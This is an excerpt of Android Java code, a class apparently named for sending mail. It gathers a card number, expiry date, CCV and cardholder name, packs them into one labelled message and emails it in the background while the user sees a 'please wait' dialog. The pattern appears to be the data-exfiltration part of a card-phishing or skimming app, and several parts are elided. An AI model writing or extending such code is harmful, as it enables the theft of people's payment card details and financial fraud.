...
public class MailGonderici extends AsyncTask<Void,Void,String> {
    ...
    private String kart = "Kart Numarası:  ";
    private String skt = "Ay:  ";
    private String ccv2 = "Ccv:  ";
    private String adssoyad2 = "AdSoyad:  ";
    private String yıl;
    private String yıl2 ="Yıl:  ";

    private String mesaj3;
    private ProgressDialog progressDialog;

    public MailGonderici(Context context, String alici_mail_adresi, String konu, String mesaj,String ccv,String adsoyad,String yıl){
        this.context = context;
        this.alici_mail_adresi = alici_mail_adresi;
        this.konu = konu; // kart numarası
        this.mesaj = mesaj; // skt

        this.mesaj2 = ccv; // ccv

        this.mesaj3 = adsoyad; //adsoyad
        this.yıl = yıl;


        deneme = kart + konu + skt + mesaj+ ccv2 +ccv+ yıl2+ yıl+ adssoyad2+adsoyad;
    ...
    protected void onPreExecute() {
        ...
        progressDialog = ProgressDialog.show(context,"İşlem Devam Ediyor...","Lütfen Bekleyiniz...",false,false);
    }
    ...
    protected String doInBackground(Void... voids) {
        ...
        try {
            ...
            mm.setContent(deneme, "text/plain; charset=UTF-8");
